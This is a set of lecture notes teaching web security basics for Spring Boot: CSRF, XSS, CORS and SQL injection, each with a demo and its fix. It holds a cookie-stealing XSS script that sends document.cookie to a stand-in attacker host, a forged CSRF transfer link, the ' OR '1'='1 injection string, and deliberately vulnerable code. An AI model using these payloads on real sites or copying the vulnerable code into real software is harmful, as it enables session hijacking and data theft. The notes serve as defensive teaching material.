# Attack #1 — CSRF (Cross-Site Request Forgery)

> 💡 **Interview Tip:** The instructor specifically calls this out as a topic frequently asked in interviews. Know it well.

---

## The Problem It Exploits

When you log into a website (say a banking site), your browser stores a **Session ID in a cookie**. From that point on, every request your browser makes to that site **automatically includes that cookie** — that's just how browsers work.

The question is: *what if someone tricks your browser into making a request you never intended?*

That's exactly what CSRF does.

---

## How CSRF Works — Plain English

```
┌─────────────────────────────────────────────────────────────┐
│                      CSRF Attack Flow                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Step 1: You log into bank.com                              │
│          → Server creates a Session                         │
│          → Browser stores Session ID in Cookie              │
│                                                             │
│  Step 2: You receive a malicious link                       │
│          (via WhatsApp / Email / random website)            │
│          → Looks like: "Click here to claim reward!"        │
│                                                             │
│  Step 3: You click it                                       │
│          → Behind the scenes, it calls:                     │
│            bank.com/transfer?amount=1000&to=attacker        │
│                                                             │
│  Step 4: Your browser auto-attaches the Session Cookie      │
│          → Bank sees a valid session → approves request     │
│                                                             │
│  Result: Money transferred. You had no idea.                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

The key insight the instructor gives: **you never knowingly made that request.** You just clicked a link. But your browser did the rest — automatically attaching your session — and the server had no way to tell it was forged.

---

## The Demo (Spring Boot)

The instructor builds this with two parts:

**Part 1 — The Server (your bank)**

```java
// Authentication is mandatory for ALL requests
http.sessionManagement(session ->
    session.sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED))
  .authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
  .formLogin(Customizer.withDefaults());
```

And a transfer endpoint:
```java
@GetMapping("/transfer")
public String transferMoney(@RequestParam String amount,
                            @RequestParam String to) {
    return "Transferred $" + amount + " to " + to;
}
```

> The instructor says: *"Your expectation is — anyone calling this API is already authenticated. You've enforced that. You feel safe."*

**Part 2 — The Attacker's HTML page**

```html
<h2>Click Below to Claim Your Reward!</h2>

<a href="http://localhost:8080/transfer?amount=1000&to=attacker">
    <button>Claim My Money</button>
</a>
```

This HTML is hosted by the attacker. It looks like a reward page. But the link silently calls your bank's transfer endpoint.

**What happens when you click:**
- Browser fires a GET request to `localhost:8080/transfer`
- Browser **automatically appends** the Session Cookie (e.g. `ME1N`)
- Server sees: valid session → executes the transfer
- You never knew

---

## Why Is This Possible?

The instructor sums it up cleanly:

> *"The browser automatically adds the session whenever any request is made. The server sees a valid session and just trusts it."*

This attack works **only where sessions/state are maintained** (stateful authentication). It's less relevant in stateless systems (like JWT-based APIs where the token isn't auto-sent by the browser).

---

## Protection: CSRF Token

```
┌──────────────────────────────────────────────────────────────┐
│                   How CSRF Token Works                       │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. When you log in, server returns TWO things:              │
│       → Session ID (in Cookie)                               │
│       → CSRF Token (in response body / hidden form field)    │
│                                                              │
│  2. Every legitimate form on the real website                │
│     automatically includes this CSRF Token in requests       │
│                                                              │
│  3. Attacker's HTML page does NOT have this token            │
│     (they can't read it — it's only known to your browser    │
│      on the legitimate site)                                 │
│                                                              │
│  4. Server checks: does this request have a valid token?     │
│       → Yes → Legitimate request → Allow                     │
│       → No  → Forged request    → Block                      │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

The instructor's exact words:
> *"Only those who are a legitimate source know what the token is and will append it — so the server knows whether the request is coming from a legitimate source or not."*

---

## Quick Summary

| | Detail |
|---|---|
| **What it is** | Tricking your browser into making unwanted requests |
| **Requirement** | User must already be authenticated (session-based) |
| **How** | Attacker sends malicious link; browser auto-sends cookie |
| **Protection** | CSRF Token — only the real site knows it |
| **Applicable where** | Stateful / session-based authentication |

---
# Attack #2 — XSS (Cross-Site Scripting)

---

## The Problem It Exploits

Think about any website that has a **comments section** — YouTube, a blog, a forum. Users can type something and it gets saved. Later, when anyone visits that page, all comments are loaded and displayed.

Now the question is: *what if someone types a JavaScript `<script>` tag instead of a normal comment?*

If the website doesn't handle that carefully, **the browser will execute that script** for every user who visits the page. That's XSS.

---

## How XSS Works — Plain English

```
┌─────────────────────────────────────────────────────────────────┐
│                       XSS Attack Flow                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Step 1: Website has a comments section                         │
│          → Users can post comments                              │
│          → Comments are stored in DB                            │
│          → All comments shown to every visitor                  │
│                                                                 │
│  Step 2: Attacker posts a comment — but it's a script           │
│          → <script>alert("XSS Attack")</script>                 │
│          → Server stores it as-is (no sanitization)             │
│                                                                 │
│  Step 3: Any user visits the comments page                      │
│          → Server loads all comments from DB                    │
│          → Browser sees the <script> tag                        │
│          → Browser executes it                                  │
│                                                                 │
│  Result: Script runs on every visitor's browser                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## "Okay but it's just a popup, what's the big deal?"

The instructor anticipates this exact question. A simple `alert()` popup looks harmless. But replace that with this:

```javascript
<script>
  fetch('http://attacker-site.com/steal?cookie=' + document.cookie);
</script>
```

Now look at what happens:

```
┌─────────────────────────────────────────────────────────────────┐
│                  The Real Danger of XSS                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Every visitor's browser executes this script                   │
│         ↓                                                       │
│  document.cookie grabs their Session ID (JSESSIONID)            │
│         ↓                                                       │
│  Sends it silently to attacker's server                         │
│         ↓                                                       │
│  Attacker now has your Session ID                               │
│         ↓                                                       │
│  Attacker can impersonate you on any site                       │
│  where that session is valid — freely, totally                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

The instructor's exact words:
> *"Now attacker knows your cookie and this cookie only has your session ID. Now wherever you are authenticated where this session ID is applicable, attacker can access it freely. Totally."*

---

## The Demo (Spring Boot)

The instructor builds two endpoints:

**The Controller**
```java
@Controller  // NOT @RestController — because we want to render HTML
public class TestXSS {

    private final List<String> comments = new ArrayList<>();

    @GetMapping("/xss")
    public String showComments(Model model) {
        model.addAttribute("comments", comments);
        return "xss"; // loads xss.html
    }

    @PostMapping("/comment")
    public String addComment(@RequestParam String comment) {
        comments.add(comment); // no sanitization at all
        return "redirect:/xss";
    }
}
```

> The instructor points out: *"Whatever the comment, I am directly adding it into my list — whether it's a script or something else, I don't care. That's the vulnerability."*

> Also note: since it's a `@Controller` (not `@RestController`), returning `"xss"` means Spring will look for `xss.html` and **render it** — this is important because the script needs to actually execute in a browser.

**The HTML Template (xss.html)**
```html
<h2>Leave a Comment</h2>

<form action="/comment" method="post">
    <input type="text" name="comment" required>
    <button type="submit">Submit</button>
</form>

<h3>Comments:</h3>
<ul>
    <!-- Comments injected WITHOUT sanitization — th:utext renders raw HTML -->
    <li th:utext="${comment}" th:each="comment : ${comments}"></li>
</ul>
```

> The critical thing here is `th:utext` — this renders the value as **raw HTML**, meaning if a script tag is stored, the browser will treat it as actual HTML/JavaScript and run it. A safe alternative would be `th:text` which escapes special characters.

---

## Attack Sequence Visualized

```
┌──────────────────────────────────────────────────────────────────┐
│                    Full XSS Attack Sequence                      │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ATTACKER                                                        │
│     │                                                            │
│     ├─ POST /comment                                             │
│     │   body: <script>fetch('attacker.com?c='+document.cookie)   │
│     │         </script>                                          │
│     │                                                            │
│     └─ Script stored in DB/memory ✓                              │
│                                                                  │
│  VICTIM (any user who visits the page)                           │
│     │                                                            │
│     ├─ GET /xss                                                  │
│     │   → Server loads all comments (including the script)       │
│     │   → HTML is rendered in browser                            │
│     │   → Browser sees <script> tag                              │
│     │   → Browser executes it                                    │
│     │                                                            │
│     └─ document.cookie sent silently to attacker ✗               │
│                                                                  │
│  ATTACKER now has victim's JSESSIONID                            │
│  → Can impersonate victim on the site                            │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Protection: Escaping User Input

The fix is straightforward — **never trust user input.** Before storing or displaying anything a user typed, convert special characters so the browser treats them as plain text, not HTML/code.

```
Raw input:    <script>alert("XSS")</script>
After escape: &lt;script&gt;alert("XSS")&lt;/script&gt;
```

Now the browser just **displays** it as text — it doesn't execute it.

Two rules the instructor gives:

1. **Proper escaping** — convert special characters like `<` to `&lt;` before rendering
2. **Proper validation** — define what values are allowed and reject everything else

In Thymeleaf specifically, just switching from `th:utext` (raw HTML) to `th:text` (escaped text) would have prevented this entire attack.

---

## CSRF vs XSS — Quick Contrast

```
┌─────────────────┬──────────────────────────┬──────────────────────────┐
│                 │         CSRF             │          XSS             │
├─────────────────┼──────────────────────────┼──────────────────────────┤
│ How it works    │ Tricks browser to send   │ Injects script into a    │
│                 │ an unwanted request      │ page others will visit   │
│ What it needs   │ User must be logged in   │ Website must display     │
│                 │ (session-based)          │ unsanitized user input   │
│ Main goal       │ Perform actions on       │ Steal cookies/sessions   │
│                 │ behalf of victim         │ or deface the site       │
│ Protection      │ CSRF Token               │ Escape & validate input  │
└─────────────────┴──────────────────────────┴──────────────────────────┘
```

---
# #3 — CORS (Cross-Origin Resource Sharing)

> The instructor is very clear upfront: **CORS is NOT an attack.** It's a security feature built into browsers. But it's important to understand because it directly controls which clients your server will talk to.

---

## The Problem It Solves

Imagine your server is running and accepting requests. Valid clients can call it — but so can attackers. Your server needs a way to say: *"I will only entertain requests coming from these specific places."*

That's exactly what CORS does.

---

## What Is "Origin"?

Before anything else, the instructor defines this clearly:

```
Origin = Protocol + Domain + Port

Example:
https   ://  localhost  :  8080
│             │              │
Protocol    Domain          Port
```

If **any one** of these three things is different between the client and server — they are considered **different origins.**

---

## Different Origin Examples

The instructor walks through three cases:

```
┌─────────────────────────────────────────────────────────────────┐
│                   What Counts as Different Origin               │
├───────────────┬──────────────────────────┬──────────────────────┤
│   Case        │  Client                  │  Server              │
├───────────────┼──────────────────────────┼──────────────────────┤
│ Different     │  https://localhost:8080  │  http://localhost    │
│ Protocol      │                          │  :8080               │
│               │  ← https vs http →       │  DIFFERENT ✗         │
├───────────────┼──────────────────────────┼──────────────────────┤
│ Different     │  https://localhost:9090  │  https://localhost   │
│ Port          │                          │  :8080               │
│               │  ← 9090 vs 8080 →        │  DIFFERENT ✗         │
├───────────────┼──────────────────────────┼──────────────────────┤
│ Different     │  https://sub.localhost   │  https://localhost   │
│ Domain        │  :9090                   │  :9090               │
│               │  ← sub.localhost vs →    │  DIFFERENT ✗         │
│               │    localhost             │                      │
└───────────────┴──────────────────────────┴──────────────────────┘
```

> If the origin is the **same** — no issues at all. The browser allows it freely.
> If the origin is **different** — browser blocks it by default, unless the server explicitly allows it.

---

## How CORS Works — The Full Picture

```
┌──────────────────────────────────────────────────────────────────┐
│                     CORS Flow                                    │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│   CLIENT (https://localhost:9090)                                │
│       │                                                          │
│       │  sends request to →                                      │
│       │                                                          │
│   SERVER (https://localhost:8080)                                │
│       │                                                          │
│       ├── Checks: is this origin in my allowed list?             │
│       │                                                          │
│       │     YES → Response goes through ✓                        │
│       │      NO → Browser blocks the response ✗                  │
│                                                                  │
│   Server communicates allowed origins via response header:       │
│       Access-Control-Allow-Origin: https://localhost:9090        │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

> Important nuance: the request **does reach** the server. It's the **browser** that enforces CORS — it checks the response headers and decides whether to show the response to your JavaScript or block it.

---

## The Demo — Configuring CORS in Spring Boot

The instructor shows how to whitelist specific origins in `SecurityConfig.java`:

```java
http.cors(cors -> cors.configurationSource(request -> {
    CorsConfiguration config = new CorsConfiguration();

    // Only this origin is allowed
    config.setAllowedOrigins(List.of("https://sub.localhost:9090"));

    // These HTTP methods are allowed
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));

    // These headers are allowed
    config.setAllowedHeaders(List.of("Authorization", "Content-Type"));

    config.setAllowCredentials(true);
    return config;
}))
```

What this means in plain English:
- Only requests coming from `https://sub.localhost:9090` will be entertained
- Any other origin? Server won't respond to it
- You control exactly which methods and headers are permitted too

---

## CORS as a First Line of Defense

This is a really nice point the instructor makes — CORS and CSRF actually work **together:**

```
┌──────────────────────────────────────────────────────────────────┐
│              CORS + CSRF — Layered Defense                       │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Attacker hosts malicious page on:                               │
│  http://evil-site.com                                            │
│         │                                                        │
│         │  tries to call your server at:                         │
│         │  https://yourbank.com/transfer                         │
│         │                                                        │
│  CORS CHECK (First Gate)                                         │
│         │                                                        │
│         ├── Is http://evil-site.com in the allowed origins?      │
│         │         NO → Request blocked here itself ✗             │
│         │                                                        │
│  CSRF TOKEN CHECK (Second Gate)                                  │
│         │                                                        │
│         ├── Even if origin somehow passes,                       │
│         │   does the request carry a valid CSRF token?           │
│         │         NO → Blocked again ✗                           │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

The instructor's words:
> *"CORS can become the first line of defense. If you are clicking some link and that attacker's server is running on a different origin — CORS will not even entertain it. Because the server has only allowed requests from specific origins."*

---

## Quick Summary

| | Detail |
|---|---|
| **What it is** | A browser security feature, not an attack |
| **What it does** | Restricts which origins can talk to your server |
| **Origin =** | Protocol + Domain + Port |
| **Default behavior** | Different origin → browser blocks response |
| **How to allow** | Server sets `Access-Control-Allow-Origin` header |
| **Role in security** | Acts as first gate before CSRF token check |

---
# Attack #4 — SQL Injection

---

## The Problem It Exploits

Whenever your application accepts user input and **directly puts it into a database query**, you're in trouble. The user might not type a name or a search term — they might type a **piece of SQL code** instead.

If your application doesn't handle that, the attacker can manipulate your query to return unauthorized data, get table names, or even **delete your entire database.**

---

## How SQL Injection Works — Plain English

The instructor gives a very clean example. Imagine a search feature:

```
Normal expectation:
User types:  "John"
Query runs:  SELECT * FROM user_details WHERE user_name = 'John'
Result:      Returns John's data only ✓

What attacker does:
User types:  ' OR '1'='1
Query runs:  SELECT * FROM user_details WHERE user_name = '' OR '1'='1'
Result:      Returns ALL rows in the table ✗
```

Why? Because `'1'='1'` is always true — so the WHERE condition becomes true for every row.

---

## Visualizing the Injection

```
┌──────────────────────────────────────────────────────────────────┐
│                   SQL Injection Flow                             │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Your code:                                                      │
│  "SELECT * FROM user_details WHERE user_name = '" + name + "'"  │
│                                                                  │
│  Normal input:   name = "John"                                   │
│  Query becomes:                                                  │
│  SELECT * FROM user_details WHERE user_name = 'John'             │
│  → Returns only John's record ✓                                  │
│                                                                  │
│  Malicious input:   name = "' OR '1'='1"                        │
│  Query becomes:                                                  │
│  SELECT * FROM user_details WHERE user_name = '' OR '1'='1'     │
│  → '1'='1' is always TRUE                                        │
│  → Returns ALL records in the table ✗                            │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

The instructor walks through this character by character:
> *"First this quote will finish the username condition. Then it will append OR '1'='1'. And then the last quote completes the syntax. Now your query becomes — where username is empty OR 1 equals 1 — which is always true. So it returns everything."*

---

## What Damage Can SQL Injection Do?

The instructor lists these out clearly:

```
┌──────────────────────────────────────────────────────────┐
│            What an Attacker Can Do                       │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  ✗  Read unauthorized data (other users' records)        │
│  ✗  Find out database name                               │
│  ✗  Find out all table names                             │
│  ✗  Find out all column names                            │
│  ✗  Delete entire tables or the database                 │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

---

## The Demo (Spring Boot)

**The Controller**
```java
@GetMapping("/find")
public List<UserDetails> findUser(@RequestParam String name) {
    return userDetailsService.findByName(name);
}
```

**The Vulnerable Query**
```java
// UNSAFE — directly concatenating user input into SQL
public List<UserDetails> findByName(String name) {
    String sql = "SELECT * FROM user_details WHERE user_name = '"
                 + name + "'";
    return entityManager.createNativeQuery(sql, UserDetails.class)
                        .getResultList();
}
```

The problem is on this line — user input is directly glued into the SQL string. Whatever the user types becomes part of the query.

**Calling the vulnerable endpoint:**
```
Normal call:
GET /find?name=AA
→ Returns only AA's record

Malicious call:
GET /find?name=' OR '1'='1
→ Returns ALL records in the database
```

The instructor shows in the demo that the DB has two users — AA and BB. With the injection, both come back even though you only asked for one.

---

## Protection — Parameterized Queries

The fix is to **never directly concatenate** user input into SQL. Instead, use a **parameterized query** — you pass the input as a parameter, and the database treats it as a plain value, never as executable SQL code.

```java
// SAFE — using parameterized query
public List<UserDetails> findByName(String name) {
    String sql = "SELECT * FROM user_details WHERE user_name = :name";
    return entityManager.createNativeQuery(sql, UserDetails.class)
                        .setParameter("name", name)  // treated as value, not SQL
                        .getResultList();
}
```

```
┌──────────────────────────────────────────────────────────────────┐
│            Parameterized Query — How It Helps                    │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Malicious input:  ' OR '1'='1                                   │
│                                                                  │
│  With raw concat:                                                │
│  WHERE user_name = '' OR '1'='1'   ← SQL executes this ✗        │
│                                                                  │
│  With parameterized query:                                       │
│  WHERE user_name = :name                                         │
│  → :name is replaced with the literal string  ' OR '1'='1       │
│  → Database looks for a user whose name IS literally that string │
│  → No match found → Returns empty list []  ✓                     │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

The instructor confirms this in the demo — after switching to a parameterized query, the same malicious input returns an empty list `[]` instead of all records. The injection is completely neutralized.

> Also worth noting: the instructor mentions this connects to what was already covered in the **JPQL section** of the Spring Boot playlist — parameterized queries are the standard safe way to handle this.

---

## Quick Summary

| | Detail |
|---|---|
| **What it is** | Injecting SQL code through user input fields |
| **Why it works** | User input is directly placed into SQL query string |
| **What attacker can do** | Read, steal, or delete unauthorized DB data |
| **Protection** | Parameterized queries — treat input as value, not code |

---

## Full Lecture Recap — All 4 Attacks

```
┌────────────────┬─────────────────────────────┬──────────────────────────────┐
│   Attack       │   How It Works               │   Protection                │
├────────────────┼─────────────────────────────┼──────────────────────────────┤
│ CSRF           │ Tricks browser into making  │ CSRF Token — only real site  │
│                │ unwanted requests using      │ knows it                    │
│                │ your session cookie          │                             │
├────────────────┼─────────────────────────────┼──────────────────────────────┤
│ XSS            │ Injects malicious script    │ Escape user input            │
│                │ into pages other users see   │ Validate before rendering   │
├────────────────┼─────────────────────────────┼──────────────────────────────┤
│ CORS           │ Not an attack — browser     │ Server whitelists allowed    │
│                │ security feature that        │ origins via                 │
│                │ blocks cross-origin requests │ Access-Control-Allow-Origin │
├────────────────┼─────────────────────────────┼──────────────────────────────┤
│ SQL Injection  │ Malicious SQL code typed    │ Parameterized queries —      │
│                │ into input fields            │ treat input as value,       │
│                │                             │ never as SQL                │
└────────────────┴─────────────────────────────┴──────────────────────────────┘
```

---

That's the complete lecture! These four concepts form the foundation of why Spring Security exists. In the upcoming lectures, the instructor will show how Spring Security handles CSRF tokens, CORS configuration, and more — and now you'll understand exactly *why* each feature is there.